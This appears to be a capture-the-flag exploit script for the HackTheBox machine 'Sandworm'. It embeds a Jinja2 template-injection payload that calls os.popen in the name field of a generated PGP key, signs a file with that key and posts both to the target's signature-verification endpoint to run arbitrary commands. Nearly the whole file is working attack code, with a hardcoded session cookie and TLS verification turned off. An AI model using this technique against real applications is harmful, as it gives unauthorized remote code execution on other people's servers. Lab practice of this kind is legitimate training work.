#!/bin/python3
# A Python script written to create keys (PGP Encryption) with required payload, generate public key and sign a file to generate a signature file which and then send them to the target.
# This script was written to solve First Part of HackTheBox Machine Called "Sandworm". It exploits SSTI in the web application and achieves RCE (Remote Code Execution)
# python3 GPGInjection.py <command_to_execute_on_machine> <file_to_be_signed(any file with any text)>
# Example: python3 GPGInjection.py id test.txt
# Output: You will see the response from the web app's server which will contain the result of our RCE
# Hint for User: Do not waste time on trying out payloads for reverse shell. Enumerate instead!

import gnupg, sys, requests
from bs4 import BeautifulSoup
from urllib3.exceptions import InsecureRequestWarning

# Required Inputs
payload = "{{{{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('{}').read() }}}}".format(sys.argv[1])
fileToBeSigned = sys.argv[2]

gpg = gnupg.GPG(gnupghome='/home/parrot/sandworm/load/gpgInjection')
gpg.encoding = 'utf-8'

print("[*] Starting GPG Signed Injection\n")

print("[*] Your Payload: {}\n".format(payload))

print("[*] Creating Required GPG Key")

# Data required to generate key
key_type="RSA"
key_length=4096
name_real=payload
name_comment=""
name_email="hack@you.com"
expire_date=0 
passphrase="riseandshine"

# Generated key
input_data = gpg.gen_key_input(key_type=key_type, key_length=key_length, name_real=name_real, name_comment=name_comment, name_email=name_email, expire_date=expire_date, passphrase=passphrase)
key = gpg.gen_key(input_data)

if(key.fingerprint != None):
    print("[+] Key has been created\n")
else:
    print("[!] An Error has Occured")
    sys.exit(0)

# Exporting Public Key
fingerprint = key.fingerprint
ascii_armored_public_keys = gpg.export_keys(fingerprint, armor=True, passphrase=passphrase, output="payload-gpg.pub")
print("[+] Public Key has been exported")

# Signing File
stream = open(fileToBeSigned, "r")
signed_data = gpg.sign_file(stream, keyid=fingerprint, passphrase=passphrase, clearsign=True, output="payload.asc")
print("[+] File has been signed")

# Deleting Keys
ok = gpg.delete_keys(fingerprints=fingerprint, secret=True, passphrase=passphrase)
ok = gpg.delete_keys(fingerprints=fingerprint, passphrase=passphrase)
print("[+] Keys has been deleted\n\n")

# Reading Public Keys and Signature File
pubFileFd = open("payload-gpg.pub", "r")
publicFile = pubFileFd.read()
pubFileFd.close()

sigFileFd = open("payload.asc", "r")
signatureFile = sigFileFd.read()
sigFileFd.close()

# Required Data
URL = "https://ssa.htb/process"
BODY = {
    "signed_text": signatureFile,
    "public_key": publicFile
}
HEADERS = {"Connection": "close", 
"Content-Type": "application/x-www-form-urlencoded", 
"X-Requested-With": "XMLHttpRequest","Origin": "https://ssa.htb", "Host": "ssa.htb"}
COOKIES = {"session" : "eyJfZnJlc2giOmZhbHNlfQ.ZNx9Bw.NLrRPETj55Il1Mt8ft87oHdF_K0"}

# Disabling Warning for insecure request
requests.urllib3.disable_warnings(category=InsecureRequestWarning)

# Sending GET Request
response = requests.post(URL, data=BODY, verify=False, headers=HEADERS, cookies=COOKIES)

responseInBytes = response.content
responseAsString = responseInBytes.decode()

#responseWeNeed = responseAsString.split("gpg: Good signature from ")[1].split("\"")[1]
responseWeNeed = responseAsString

print(responseWeNeed)

print("\n\n[+] Script Successfully Exited")
